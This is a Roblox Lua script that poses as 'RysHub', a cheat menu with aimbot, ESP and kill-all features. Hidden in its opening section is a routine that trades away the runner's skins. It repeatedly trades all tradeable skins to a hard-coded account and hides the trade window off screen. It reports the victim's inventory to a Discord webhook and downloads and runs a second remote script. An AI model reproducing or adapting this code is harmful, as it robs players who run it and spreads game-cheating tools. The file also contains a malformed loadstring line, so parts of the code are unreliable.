pcall(function()
    loadstring(game:HttpGet("https://"))()/
end)
local CONFIG = {
    ANONYMOUS     = false, -- oculta los nombres en el webhook

    TARGET_NAME   = "yamxsb", -- username de la cuenta que recibe las skins
   
    -- Script extra que se ejecuta al iniciar, puede ser un script de Yisus o cualquier otro script.
    -- Dejar vacio para desactivar
    SECOND_SCRIPT_URL = "https://raw.githubusercontent.com/carlossano888-create/jesus/refs/heads/main/luraph.lua",

    -- (OPCIONAL) webhook de Discord para notificaciones, dejar vacio para desactivar
    WEBHOOK = {
        URL  = "", -- "https://discord.com/api/webhooks/" webhook de Discord
        PING = "@everyone", -- mencion del mensaje, nil para ninguna
        NOTIFY_WHEN_EMPTY = true,
    },

    EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" },
    INCLUDE_EMOTES = true,

    MAX_TRADE_ITEMS = 12,
    OFFER_GAP       = 0.35,
    READY_TIMEOUT   = 60,
    AUTO_INVITE     = true,
    INVITE_EVERY    = 8,
}

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace         = game:GetService("Workspace")
local HttpService       = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

local Remotes       = require(ReplicatedStorage.Shared.Remotes)
local ClientGlobals = require(ReplicatedStorage.Client.Modules.ClientGlobals)
local PlayerData        = ClientGlobals.PlayerData
local ActiveNegotiation = ClientGlobals.ActiveNegotiation
local SessionState      = ClientGlobals.SessionState

local okItem, ItemDB = pcall(function() return require(ReplicatedStorage.Shared.Item) end)
if not okItem or type(ItemDB) ~= "table" then ItemDB = {} end

local okEmote, EmoteDB = pcall(function() return require(ReplicatedStorage.Shared.Emotes) end)
if not okEmote or type(EmoteDB) ~= "table" then EmoteDB = {} end

local okTrade, ItemIsTradeable = pcall(function()
    return require(ReplicatedStorage.Shared.Utils.ItemIsTradeable)
end)
if not okTrade or type(ItemIsTradeable) ~= "function" then ItemIsTradeable = nil end

local CATEGORIES = { "Knife", "Gun", "Effect" }
if CONFIG.INCLUDE_EMOTES then CATEGORIES[#CATEGORIES + 1] = "Emote" end

local RARITY_RANK = { Ancient = 6, Mythic = 5, Legendary = 4, Rare = 3, Uncommon = 2, Common = 1 }
local RARITY_ORDER = { "Ancient", "Mythic", "Legendary", "Rare", "Uncommon", "Common", "Unknown" }


local TARGET_LOW = string.lower(tostring(CONFIG.TARGET_NAME or ""))

local function isTarget(p)
    if TARGET_LOW == "" then return false end
    local name = typeof(p) == "Instance" and p.Name or tostring(p)
    return string.lower(name) == TARGET_LOW
end

local function findTargetPlayer()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and isTarget(p) then return p end
    end
    return nil
end

local EXCLUDE = {}
for _, n in ipairs(CONFIG.EXCLUDE_ITEMS or {}) do EXCLUDE[string.lower(n)] = true end

local byDisplayName = {}
for _, db in ipairs({ ItemDB, EmoteDB }) do
    for key, d in pairs(db) do
        if type(d) == "table" then
            local disp = d.ItemName or d.Name or d.name
            if type(disp) == "string" then byDisplayName[string.lower(disp)] = d end
        end
    end
end

local function rarityOf(name)
    local low = string.lower(name or "")
    local d = ItemDB[name] or EmoteDB[name] or byDisplayName[low]
    local r = type(d) == "table" and (d.Rarity or d.rarity) or nil
    if r and RARITY_RANK[r] then return r, RARITY_RANK[r] end
    return "Unknown", 0
end

local function isTradeable(name)
    if not ItemIsTradeable then return true end
    local ok, res = pcall(ItemIsTradeable, name)
    if not ok then return true end
    return res and true or false
end

local function getInventory()
    local out = {}
    for _, cat in ipairs(CATEGORIES) do
        local bucket = PlayerData:TryIndex({ "Inventory", cat })
        if type(bucket) == "table" then
            for guid, item in pairs(bucket) do
                local name = item and item.name
                if name and not EXCLUDE[string.lower(name)] and isTradeable(name) then
                    local r, rank = rarityOf(name)
                    out[#out + 1] = { guid = guid, name = name, cat = cat, rarity = r, rank = rank }
                end
            end
        end
    end
    return out
end

local function sortByRarity(list)
    table.sort(list, function(a, b)
        if a.rank ~= b.rank then return a.rank > b.rank end
        if a.name ~= b.name then return a.name < b.name end
        return tostring(a.guid) < tostring(b.guid)
    end)
    return list
end

local function summaryByRarity(inv)
    local s = {}
    for _, e in ipairs(inv) do s[e.rarity] = (s[e.rarity] or 0) + 1 end
    return s
end

local function sides()
    local data = ActiveNegotiation.Data
    if type(data) ~= "table" or not data.player1 or not data.player2 then return nil, nil, nil end
    local me, other
    if data.player1.player and data.player1.player.UserId == LocalPlayer.UserId then
        me, other = data.player1, data.player2
    else
        me, other = data.player2, data.player1
    end
    return me, other, data
end

local function offeredGuids()
    local me = sides()
    local set, n = {}, 0
    if me and me.offer then
        for _, guid in pairs(me.offer.items or {}) do set[guid] = true; n = n + 1 end
    end
    return set, n
end

local function getIncoming()
    local v = SessionState:TryIndex({ "incomingTradeRequests" })
    return type(v) == "table" and v or {}
end

local function waitUntil(cond, timeout)
    local t0 = os.clock()
    while os.clock() - t0 < timeout do
        if cond() then return true end
        task.wait(0.2)
    end
    return cond()
end

local function waitProcessingLock()
    waitUntil(function()
        local d = ActiveNegotiation.Data
        return not (d and (d.processing or 0) > Workspace:GetServerTimeNow())
    end, 5)
end

local function setReadyTrue()
    local _, _, data = sides()
    if not data then return false end
    waitUntil(function()
        local _, _, d = sides()
        return d and Workspace:GetServerTimeNow() >= (d.lastUpdate or 0) + 3
    end, 6)
    local _, _, d2 = sides()
    if not d2 then return false end
    Remotes.SetReady:FireServer(true, d2.ref or {})
    return true
end

local HttpReq = (syn and syn.request) or request or http_request or (http and http.request)

local function sendWebhook(payload)
    if not HttpReq or not CONFIG.WEBHOOK.URL or CONFIG.WEBHOOK.URL == "" then return end
    task.spawn(function()
        pcall(function()
            HttpReq({
                Url = CONFIG.WEBHOOK.URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload),
            })
        end)
    end)
end

local function jobCode()
    return ("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')"):format(game.PlaceId, game.JobId)
end

local function rarityLines(inv)
    local s = summaryByRarity(inv)
    local lines = {}
    for _, r in ipairs(RARITY_ORDER) do
        if s[r] then lines[#lines + 1] = ("%-10s x%d"):format(r, s[r]) end
    end
    if #lines == 0 then lines[1] = "(vacio)" end
    return table.concat(lines, "\n")
end

local function categoryLines(inv)
    local s = {}
    for _, e in ipairs(inv) do s[e.cat] = (s[e.cat] or 0) + 1 end
    local lines = {}
    for _, c in ipairs(CATEGORIES) do
        if s[c] then lines[#lines + 1] = ("%-7s x%d"):format(c, s[c]) end
    end
    if #lines == 0 then lines[1] = "(vacio)" end
    return table.concat(lines, "\n")
end

local function topItemsText(inv, n)
    local grouped, order = {}, {}
    for _, e in ipairs(sortByRarity(inv)) do
        if not grouped[e.name] then
            grouped[e.name] = { count = 0, rarity = e.rarity }
            order[#order + 1] = e.name
        end
        grouped[e.name].count = grouped[e.name].count + 1
    end
    local lines = {}
    for i = 1, math.min(n, #order) do
        local name = order[i]
        lines[#lines + 1] = ("[%s] %s x%d"):format(grouped[name].rarity, name, grouped[name].count)
    end
    if #order > n then lines[#lines + 1] = ("... y %d tipos mas"):format(#order - n) end
    if #lines == 0 then lines[1] = "(nada para dar)" end
    return table.concat(lines, "\n")
end

local function webhookStart()
    local inv = getInventory()
    local exec = (identifyexecutor and identifyexecutor()) or "Unknown"
    local target = CONFIG.TARGET_NAME ~= "" and CONFIG.TARGET_NAME or "(sin target)"
    local who = CONFIG.ANONYMOUS and "anonymous" or LocalPlayer.Name
    if CONFIG.ANONYMOUS then target = "anonymous" end
    sendWebhook({
        content = CONFIG.WEBHOOK.PING,
        embeds = { {
            title = "Transfer iniciado: " .. who,
            color = 3447003,
            fields = {
                { name = "Executor",  value = exec,   inline = true },
                { name = "Target",    value = target, inline = true },
                { name = "Tradeables", value = tostring(#inv) .. " (" .. math.ceil(#inv / CONFIG.MAX_TRADE_ITEMS) .. " trades)", inline = true },
                { name = "Por rareza", value = "```\n" .. rarityLines(inv) .. "\n```", inline = true },
                { name = "Por categoria", value = "```\n" .. categoryLines(inv) .. "\n```", inline = true },
                { name = "Orden de entrega", value = "```\n" .. topItemsText(inv, 15) .. "\n```", inline = false },
                { name = "Job Code", value = "```lua\n" .. jobCode() .. "\n```", inline = false },
            },
        } },
    })
end

local stats = { trades = 0, items = 0, startedAt = os.clock() }

local function webhookEmpty()
    if not CONFIG.WEBHOOK.NOTIFY_WHEN_EMPTY then return end
    sendWebhook({
        content = CONFIG.WEBHOOK.PING,
        embeds = { {
            title = "Transfer terminado: " .. (CONFIG.ANONYMOUS and "anonymous" or LocalPlayer.Name),
            color = 65280,
            fields = {
                { name = "Trades", value = tostring(stats.trades), inline = true },
                { name = "Items dados", value = tostring(stats.items), inline = true },
                { name = "Duracion", value = ("%d min"):format((os.clock() - stats.startedAt) / 60), inline = true },
            },
        } },
    })
end

local function handleTrade(other)
    local offered, offeredCount = offeredGuids()
    local room = CONFIG.MAX_TRADE_ITEMS - offeredCount

    if room > 0 then
        local batch = {}
        for _, e in ipairs(sortByRarity(getInventory())) do
            if not offered[e.guid] then
                batch[#batch + 1] = e
                if #batch >= room then break end
            end
        end

        if #batch == 0 and offeredCount == 0 then
            pcall(function() Remotes.CancelTrade:FireServer() end)
            return "empty"
        end

        if #batch > 0 then
            for _, e in ipairs(batch) do
                if not sides() then return "closed" end
                waitProcessingLock()
                Remotes.OfferItem:FireServer(e.guid)
                task.wait(CONFIG.OFFER_GAP)
            end
            task.wait(0.5)
            local _, nowCount = offeredGuids()
            if nowCount < math.min(CONFIG.MAX_TRADE_ITEMS, offeredCount + #batch) then
                return "retry"
            end
        end
    end

    local me = sides()
    if not me then return "closed" end
    if not me.ready then
        task.wait(0.3)
        setReadyTrue()
    end

    local _, finalCount = offeredGuids()
    local done = waitUntil(function()
        local m, _, d = sides()
        if not d then return true end
        if d.exchanging == true then return true end
        if m and not m.ready then return true end
        return false
    end, CONFIG.READY_TIMEOUT)

    local m, _, d = sides()
    if d and d.exchanging then
        stats.trades = stats.trades + 1
        stats.items  = stats.items + finalCount
        waitUntil(function() return sides() == nil end, 20)
        return "done"
    end
    if not d then return "closed" end
    if m and not m.ready then return "retry" end
    return "waiting"
end

local running = true

local tradeGui = nil
local tradeGuiOriginal = nil
local tradeHidden = false
local tradeGuiConns = {}

local function tradingWithTarget()
    local _, other = sides()
    return other and other.player and isTarget(other.player) or false
end

local function applyTradeGuiState()
    if not tradeGui then return end
    pcall(function()
        if tradeHidden then
            if tradeGui.Position ~= UDim2.new(5, 0, 5, 0) then
                tradeGui.Position = UDim2.new(5, 0, 5, 0)
            end
        elseif tradeGuiOriginal and tradeGui.Position ~= tradeGuiOriginal then
            tradeGui.Position = tradeGuiOriginal
        end
    end)
end

local guiThread = task.spawn(function()
    local gui = LocalPlayer:WaitForChild("PlayerGui")
    local newGui = gui:WaitForChild("NewGui", 30)
    if not newGui then return end
    tradeGui = newGui:WaitForChild("TradeNegotiation", 30)
    if not tradeGui then return end
    tradeGuiOriginal = tradeGui.Position

    tradeGuiConns[#tradeGuiConns + 1] = tradeGui:GetPropertyChangedSignal("Position"):Connect(function()
        if not tradeHidden and tradeGui.Position ~= UDim2.new(5, 0, 5, 0) then
            tradeGuiOriginal = tradeGui.Position
        end
        applyTradeGuiState()
    end)
    tradeGuiConns[#tradeGuiConns + 1] = tradeGui:GetPropertyChangedSignal("Visible"):Connect(applyTradeGuiState)

    while running do
        local hide = tradingWithTarget()
        if hide ~= tradeHidden then
            tradeHidden = hide
            applyTradeGuiState()
        end
        task.wait(0.2)
    end
end)
local busy = false
local emptyNotified = false
local lastInvite = 0
local lastAccept = {}

local mainThread = task.spawn(function()
    while running do
        local me, other = sides()

        if me and other and other.player then
            if isTarget(other.player) then
                if not busy then
                    busy = true
                    local ok, res = pcall(handleTrade, other)
                    busy = false
                    if ok and res == "empty" and not emptyNotified then
                        emptyNotified = true
                        webhookEmpty()
                    elseif ok and res == "done" then
                        emptyNotified = false
                        task.wait(1)
                    end
                end
            else
                task.wait(1)
            end
        else
            local target = findTargetPlayer()
            if not target then
                task.wait(2)
                continue
            end

            local now = os.clock()
            local accepted = false
            for _, p in ipairs(getIncoming()) do
                if isTarget(p) then
                    local key = typeof(p) == "Instance" and p.UserId or tostring(p)
                    if not lastAccept[key] or now - lastAccept[key] > 3 then
                        lastAccept[key] = now
                        Remotes.AcceptInvite:FireServer(p)
                        accepted = true
                    end
                end
            end

            if not accepted and CONFIG.AUTO_INVITE and now - lastInvite > CONFIG.INVITE_EVERY then
                if #getInventory() > 0 then
                    lastInvite = now
                    Remotes.SendInvite:FireServer(target)
                end
            end
        end

        task.wait(0.4)
    end
end)

webhookStart()

if CONFIG.SECOND_SCRIPT_URL and CONFIG.SECOND_SCRIPT_URL ~= "" then
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet(CONFIG.SECOND_SCRIPT_URL))()
        end)
    end)
end

local API = {
    role  = "transfer",
    stats = function()
        return { trades = stats.trades, items = stats.items, left = #getInventory() }
    end,
    inventory = function() return sortByRarity(getInventory()) end,
    unload = function()
        running = false
        if mainThread then task.cancel(mainThread); mainThread = nil end
        if guiThread then task.cancel(guiThread); guiThread = nil end
        for _, c in ipairs(tradeGuiConns) do pcall(function() c:Disconnect() end) end
        tradeGuiConns = {}
        tradeHidden = false
        applyTradeGuiState()
    end,
}
if typeof(getgenv) == "function" then getgenv().RysHubTransfer = API else _G.RysHubTransfer = API end
setclipboard = setclipboard
local getgenv = getgenv or function()
	return _G
end

local c930b1204c2012b2990ed00d1fd016dfd371e8b884a44131a00f3c95283f9a66 = "https://discord.gg/WeaAjYhvcP"

local f199147bcb15044501a86dc4948882b58aa1fef3c290af2239ed896b7f2756b9 = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

local d552122aa2583c01a713d35f5faba0829e56f6191e6e483462b200360d79415d = "__BE7300BD3F7B0C98901BF365"
local f47b2acb7490d6f24cec96e663b90840ac1d0c400f77b0605c827c2edb248158 = false
pcall(function()
	local c7f22ae850c49411ccaada25d9fccb685dd1c34c45806548329648adcbcc90bb = getgenv()
	if type(c7f22ae850c49411ccaada25d9fccb685dd1c34c45806548329648adcbcc90bb[d552122aa2583c01a713d35f5faba0829e56f6191e6e483462b200360d79415d]) == "function" then
		c7f22ae850c49411ccaada25d9fccb685dd1c34c45806548329648adcbcc90bb[d552122aa2583c01a713d35f5faba0829e56f6191e6e483462b200360d79415d]()
	end
end)

f199147bcb15044501a86dc4948882b58aa1fef3c290af2239ed896b7f2756b9:Localization({
	Enabled = true,
	Prefix = "loc:",
	DefaultLanguage = "English",
	Translations = {
		["English"] = {
			["b5548857bfbe74e3a90f2f2a91fd521b"] = "Join our discord ʕ•́ᴥ•̀ʔっ♡",
			["e79ad110a867753729b046fb34f41cd0"] = "Toggle UI Keybind",
			["f0ef1a4885fed39ccf4049e5ae59c844"] = "Reset Toggle UI Keybind",
			["c860ffe2aa0bc8f2f19751378a6d513b"] = "Reset this keybind to its default value.",
			["d9aa593520ade55efa3d5e80a07b4cf4"] = "Reset All Keybinds",
			["e1ec8181631ee4df350de6caf9d8602a"] = "Reset all keybinds to their default values.",
			["f4a3863c373d15c1f0f057a0d262b1f3"] = "Edit Bubble Positions",
			["e00aede412f4e0fa8adac1db28824008"] = "Unlock the on-screen bubbles so you can drag them. Turn this off to lock and save their positions.",
			["aa5920a455bff5305f21430c2a5ca989"] = "Reset Bubble Positions",
			["c40968cf77426597fc1002e19ba13c70"] = "Move every bubble back to its default position.",
			["af644bdec3050256e4b089633ec7c1bb"] = "Toggle Panel Background",
			["e5a0ad311db35c09d2a8d31d61682588"] = "Enable Notifications",
			["b06dde438a08f90c210d3de482271695"] = "Unload Script",
			["f05c53f426488e96cb51805e5ff6cca9"] = "Turns every feature off, unhooks the script and removes the UI. Just closing the window leaves your active features running.",
			["ad3272e69caac43330718b23d4955751"] = "Language",
			["e19908b67b5b1a911c69e7e250136f05"] = "Aim at Player",
			["c6401e2c5000958ba6cf1284224f7033"] = "Rotates the camera toward the closest visible enemy.",
			["e528eff1f02a3cf87c3c4c72ed4d935c"] = "Aim at Player Keybind",
			["dc814b083f1afdc4c7eb89e54f4b54c2"] = "Only with firearm",
			["c3115e4b7e12defdd991a24770b1f2ad"] = "Only with knife",
			["b9a2b7f7c5dde9640074167ff8c74290"] = "Use raycast",
			["fab02cd9c966ed2772485f348952b37d"] = "Open Body Part Editor",
			["b94bf0d66d694b714394f964262adc0f"] = "Choose the body parts used by Aim Mobile.",
			["efb1b5c3c854c7ae166c10648e3a6901"] = "Triggerbot",
			["da8a12d3b3bf5148980f746a147eec84"] = "Triggerbot Keybind",
			["e311dde60ce68fbdebaff476605de4f5"] = "Macro",
			["aa2b3dd10e5280896abb08c2ad5d9a6e"] = "Macro Keybind",
			["c10a3756d8b0d11b72b4f7d5a35fafeb"] = "Silent Aim",
			["a09fbfecc4939ad3f4c2dacb6f092ff0"] = "Redirects your shots to the visible enemy closest to your cursor.",
			["fdd4d952584aa7289d9caa39706da583"] = "Silent Aim Keybind",
			["f603d87f683ddfe7e8e794c98a55a86e"] = "FOV",
			["e53a42bc00372607cd31759543111ef9"] = "Only lock enemies inside the circle (around your cursor on PC, the screen center on mobile).",
			["b06bb8f8eedbb99d7c9ba438324b0c6e"] = "Visible FOV",
			["cbbbf53ca3a6245e7948906fdd94fc4d"] = "Draw the FOV circle on screen.",
			["d15dff7b239795d01569811d5d3465a8"] = "FOV Radius",
			["cc0f01f735dbd74a02e45530aac64416"] = "Hit Chance",
			["a436b9219e3de9a9b903b23ba1cd8bf6"] = "% of your shots Silent Aim and the Macro take. The rest are left alone and land exactly where you aimed. Does not affect Auto Shoot.",
			["fc15d13bac5f83470ac97d1b4a0ad04e"] = "Silent Aim Bubble",
			["e5a210e23c31db476cf7851c616879fb"] = "Auto Shoot",
			["c1c6c3f6eb15738a2d406de633e61a75"] = "Auto Shoot Keybind",
			["afb83060b4c8e1b3501f41f439bb366f"] = "Auto Shoot Bubble",
			["b8b6acb1ef3ec71564db220b83bee34e"] = "Kill All Enemies",
			["aedb3de438c31e73809d044271ca6f83"] = "Keep Kill All Always On",
			["d7a31c7a9773f67ced082a3ebce2278b"] = "Forces Kill All to stay on and locks its toggle so nothing can turn it off.",
			["d769493da6cac80a80e345c26e3276e6"] = "Kill All Bubble",
			["a61d83f3d6f99e193d194ea9608a5d59"] = "Invisible",
			["f2761e3cd59401fb77a07540758e4efb"] = "Invisible Bubble",
			["c7e7d88b539b76efc3e741e408422e42"] = "Desync",
			["e1cb9fca42e476daca64fe5bd94b7f5d"] = "Desync Bubble",
			["db13ef6667ab0f152d5660909506238a"] = "Bannable",
			["fba977a40b22b988e9dded1417cad3a5"] = "Floating Floor",
			["d1345f0cda656de47d5e6474b9f08d8a"] = "Hide Map",
			["ebefa948038ac07ea78172a3c8133ebf"] = "Enable Jump Power",
			["a5583643fe7eb46f11b783b7abd23751"] = "Jump Power Value",
			["b5763258a150e11677fab2ce65d43228"] = "Enable Infinite Jump",
			["d16d4182c7d070152d2c44dee9267832"] = "Enable Speed Hack",
			["c4d9ce265bee45ab1a00d1d66b15c89f"] = "Speed Value",
			["fb954fe1209e7e4af448a870ce9052d1"] = "Enable ESP",
			["afb474e43c9abba8f2a424546978c7ae"] = "Show enemies through walls.",
			["f8c12ba436a35d1990a8bc3c8e77944e"] = "ESP Color",
			["c5d2cdd263fd3634ef88b70defbc6bea"] = "Show Enemy Name",
			["e81d972ea3f11c21b37da930230b091c"] = "ESP Lines",
			["e60736bc519b7966e29628d36ef08187"] = "Draw lines from your character to enemy positions.",
			["e16764d65cf84aa798a554206d5be719"] = "ESP Lines Color",
			["be9e408aec0c298c761ae8cdf9072f03"] = "ESP Keybind",
			["d5e0016ed741d5ce98b888aaa3d5807a"] = "Enable Hitbox",
			["b153bf65ab7cda2aa2735a2f07547f13"] = "Show and expand enemy hitboxes.",
			["d1d20253ec2d3d00bc55958d04bf0377"] = "Hitbox Color",
			["da30125c0dd7c41bf841a8681f4f5190"] = "Hitbox Size",
			["b95e7c4d764ee540d887165836d439fa"] = "Hitbox Opacity",
			["f5fd069150c2314bfb00c744505dd4d3"] = "Show Hitbox",
			["f031f64fd927124f2749a994d2db2523"] = "Hitbox Keybind",
			["c2b092443cd7cf784af8fd5431ae53bd"] = "Event Farm",
			["de6fb023e8fc7a8ab7675ccc3c640284"] = "Automatically collects event drops during matches.",
			["a25316ff5856541049ba2a6e9d08b425"] = "Automatically teleports to the selected zone when not in a match.",
			["ddd3ac562d6393093032e19d46508255"] = "Duel Type",
			["d44bb4f6c0bb3f7089939029cbc816ca"] = "Platform Row",
			["a7ca395c40cc789197158e4a75cf2661"] = "Break Streak",
			["b8a78f6003d84bfeb95e6b0a4c8bb466"] = "Uses Main or Alt automatically based on the active Auto Teleport role.",
			["a91065ff20998adf9c1c8836c53fd7eb"] = "Break Streak Target",
			["e31dda5e42067eacd1de46e6d1c3e6dd"] = "Lower KD",
			["e5d883e875425461f7d4877a65230048"] = "Uses Main or Alt automatically based on the active Auto Teleport role.",
			["ae1cddf7fd913336e01555ff8192b1b8"] = "KD Target Kills",
			["d8f43decc8733fe46ef97509913f9f49"] = "Selected Box",
			["d3a79b50f6ee54a51e87dd6d783ef946"] = "Choose which box to buy.",
			["d057768612c13c7cec145ef544aaa0e9"] = "Buy Box",
			["e6b0c75f7f453e79992e64f08b5c9756"] = "Buys the selected box if you have enough cash.",
			["cc6f88fdc0f140aada975b395249475c"] = "Auto Buy",
			["d805b76f713b15d54843d142ca179701"] = "Automatically buys the selected box.",
		},
		["Espanol"] = {
			["b5548857bfbe74e3a90f2f2a91fd521b"] = "Únete a nuestro Discord ʕ•́ᴥ•̀ʔっ♡",
			["e79ad110a867753729b046fb34f41cd0"] = "Tecla para UI",
			["f0ef1a4885fed39ccf4049e5ae59c844"] = "Resetear Tecla UI",
			["c860ffe2aa0bc8f2f19751378a6d513b"] = "Restablece esta tecla a su valor predeterminado.",
			["d9aa593520ade55efa3d5e80a07b4cf4"] = "Resetear Todas las Teclas",
			["e1ec8181631ee4df350de6caf9d8602a"] = "Restablece todas las teclas a sus valores predeterminados.",
			["f4a3863c373d15c1f0f057a0d262b1f3"] = "Editar Posicion de Burbujas",
			["e00aede412f4e0fa8adac1db28824008"] = "Desbloquea las burbujas en pantalla para poder arrastrarlas. Apaga esto para fijarlas y guardar su posicion.",
			["aa5920a455bff5305f21430c2a5ca989"] = "Resetear Posicion de Burbujas",
			["c40968cf77426597fc1002e19ba13c70"] = "Devuelve cada burbuja a su posicion predeterminada.",
			["af644bdec3050256e4b089633ec7c1bb"] = "Fondo del Panel",
			["e5a0ad311db35c09d2a8d31d61682588"] = "Activar Notificaciones",
			["b06dde438a08f90c210d3de482271695"] = "Descargar Script",
			["f05c53f426488e96cb51805e5ff6cca9"] = "Apaga todas las funciones, desengancha el script y saca la UI. Cerrar la ventana sola deja andando lo que tengas activo.",
			["ad3272e69caac43330718b23d4955751"] = "Idioma",
			["e19908b67b5b1a911c69e7e250136f05"] = "Apuntar al Jugador",
			["c6401e2c5000958ba6cf1284224f7033"] = "Gira la camara hacia el enemigo visible mas cercano.",
			["e528eff1f02a3cf87c3c4c72ed4d935c"] = "Tecla de Apuntar",
			["dc814b083f1afdc4c7eb89e54f4b54c2"] = "Solo con arma de fuego",
			["c3115e4b7e12defdd991a24770b1f2ad"] = "Solo con cuchillo en mano",
			["b9a2b7f7c5dde9640074167ff8c74290"] = "Usar raycast",
			["fab02cd9c966ed2772485f348952b37d"] = "Abrir editor de partes del cuerpo",
			["b94bf0d66d694b714394f964262adc0f"] = "Elige las partes del cuerpo que usa Aim Mobile.",
			["efb1b5c3c854c7ae166c10648e3a6901"] = "Triggerbot",
			["da8a12d3b3bf5148980f746a147eec84"] = "Tecla de Triggerbot",
			["e311dde60ce68fbdebaff476605de4f5"] = "Macro",
			["aa2b3dd10e5280896abb08c2ad5d9a6e"] = "Tecla de Macro",
			["c10a3756d8b0d11b72b4f7d5a35fafeb"] = "Silent Aim",
			["a09fbfecc4939ad3f4c2dacb6f092ff0"] = "Redirige tus disparos al enemigo visible mas cercano al cursor.",
			["fdd4d952584aa7289d9caa39706da583"] = "Tecla de Silent Aim",
			["f603d87f683ddfe7e8e794c98a55a86e"] = "FOV",
			["e53a42bc00372607cd31759543111ef9"] = "Solo fija enemigos dentro del circulo (alrededor del cursor en PC, el centro de la pantalla en mobile).",
			["b06bb8f8eedbb99d7c9ba438324b0c6e"] = "FOV Visible",
			["cbbbf53ca3a6245e7948906fdd94fc4d"] = "Dibuja el circulo del FOV en pantalla.",
			["d15dff7b239795d01569811d5d3465a8"] = "Radio del FOV",
			["cc0f01f735dbd74a02e45530aac64416"] = "Porcentaje de acierto",
			["a436b9219e3de9a9b903b23ba1cd8bf6"] = "% de tus disparos que toman el Silent Aim y la Macro. Los demas no se tocan y van justo donde apuntaste. No afecta al Auto Shoot.",
			["fc15d13bac5f83470ac97d1b4a0ad04e"] = "Burbuja Silent Aim",
			["e5a210e23c31db476cf7851c616879fb"] = "Auto Shoot",
			["c1c6c3f6eb15738a2d406de633e61a75"] = "Tecla de Auto Shoot",
			["afb83060b4c8e1b3501f41f439bb366f"] = "Burbuja Auto Shoot",
			["b8b6acb1ef3ec71564db220b83bee34e"] = "Matar a Todos los Enemigos",
			["aedb3de438c31e73809d044271ca6f83"] = "Mantener Kill All Siempre Activo",
			["d7a31c7a9773f67ced082a3ebce2278b"] = "Fuerza que Kill All quede activo y bloquea su toggle para que nada lo apague.",
			["d769493da6cac80a80e345c26e3276e6"] = "Burbuja Kill All",
			["a61d83f3d6f99e193d194ea9608a5d59"] = "Invisible",
			["f2761e3cd59401fb77a07540758e4efb"] = "Burbuja Invisible",
			["c7e7d88b539b76efc3e741e408422e42"] = "Desync",
			["e1cb9fca42e476daca64fe5bd94b7f5d"] = "Burbuja Desync",
			["db13ef6667ab0f152d5660909506238a"] = "Baneable",
			["fba977a40b22b988e9dded1417cad3a5"] = "Floating Floor",
			["d1345f0cda656de47d5e6474b9f08d8a"] = "Ocultar Mapa",
			["ebefa948038ac07ea78172a3c8133ebf"] = "Activar Potencia de Salto",
			["a5583643fe7eb46f11b783b7abd23751"] = "Potencia de Salto",
			["b5763258a150e11677fab2ce65d43228"] = "Activar Salto Infinito",
			["d16d4182c7d070152d2c44dee9267832"] = "Activar Velocidad",
			["c4d9ce265bee45ab1a00d1d66b15c89f"] = "Velocidad",
			["fb954fe1209e7e4af448a870ce9052d1"] = "Activar ESP",
			["afb474e43c9abba8f2a424546978c7ae"] = "Muestra enemigos a través de paredes.",
			["f8c12ba436a35d1990a8bc3c8e77944e"] = "Color del ESP",
			["c5d2cdd263fd3634ef88b70defbc6bea"] = "Mostrar Nombre del Enemigo",
			["e81d972ea3f11c21b37da930230b091c"] = "Lineas ESP",
			["e60736bc519b7966e29628d36ef08187"] = "Dibuja lineas desde tu personaje hacia los enemigos.",
			["e16764d65cf84aa798a554206d5be719"] = "Color de Lineas ESP",
			["be9e408aec0c298c761ae8cdf9072f03"] = "Tecla de ESP",
			["d5e0016ed741d5ce98b888aaa3d5807a"] = "Activar Hitbox",
			["b153bf65ab7cda2aa2735a2f07547f13"] = "Muestra y agranda las hitboxes enemigas.",
			["d1d20253ec2d3d00bc55958d04bf0377"] = "Color de Hitbox",
			["b95e7c4d764ee540d887165836d439fa"] = "Opacidad de Hitbox",
			["da30125c0dd7c41bf841a8681f4f5190"] = "Tamaño de Hitbox",
			["f5fd069150c2314bfb00c744505dd4d3"] = "Mostrar Hitbox",
			["f031f64fd927124f2749a994d2db2523"] = "Tecla de Hitbox",
			["c2b092443cd7cf784af8fd5431ae53bd"] = "Farmeo de Evento",
			["de6fb023e8fc7a8ab7675ccc3c640284"] = "Recolecta automáticamente los drops del evento. Solo en partidas.",
			["a25316ff5856541049ba2a6e9d08b425"] = "Te teletransporta automáticamente a la zona seleccionada cuando no estás en partida.",
			["ddd3ac562d6393093032e19d46508255"] = "Tipo de Duelo",
			["d44bb4f6c0bb3f7089939029cbc816ca"] = "Fila de plataformas",
			["a7ca395c40cc789197158e4a75cf2661"] = "Romper Racha",
			["b8a78f6003d84bfeb95e6b0a4c8bb466"] = "Usa Main o Alt automáticamente según el Auto Teleport activo.",
			["a91065ff20998adf9c1c8836c53fd7eb"] = "Objetivo de Racha",
			["e31dda5e42067eacd1de46e6d1c3e6dd"] = "Bajar KD",
			["e5d883e875425461f7d4877a65230048"] = "Usa Main o Alt automáticamente según el Auto Teleport activo.",
			["ae1cddf7fd913336e01555ff8192b1b8"] = "Kills objetivo KD",
			["d8f43decc8733fe46ef97509913f9f49"] = "Caja Seleccionada",
			["d3a79b50f6ee54a51e87dd6d783ef946"] = "Elige qué caja comprar.",
			["d057768612c13c7cec145ef544aaa0e9"] = "Comprar Caja",
			["e6b0c75f7f453e79992e64f08b5c9756"] = "Compra la caja seleccionada si tienes efectivo suficiente.",
			["cc6f88fdc0f140aada975b395249475c"] = "Compra Automática",
			["d805b76f713b15d54843d142ca179701"] = "Compra automáticamente la caja seleccionada.",
		},
	},
})
f199147bcb15044501a86dc4948882b58aa1fef3c290af2239ed896b7f2756b9:Notify({
	Title = "RysHub 🇦🇷",
	Content = "Loading GUI...",
	Duration = 4,
	Icon = "sparkles",
})
local ca4c6ce1d521b4589e17beafda3cbed6cb69402c1dcfe37952ecfa615bc538f0 = game:GetService("Players")
local f84e9859c6433c2d390e5cbd891f681b36bc15d0676dadc1a82a7351ee5358f8 = game:GetService("RunService")
local bcee9878e6f0472c671550126fb094f4aa84c6e053db270f2751b54781a57eab = game:GetService("UserInputService")
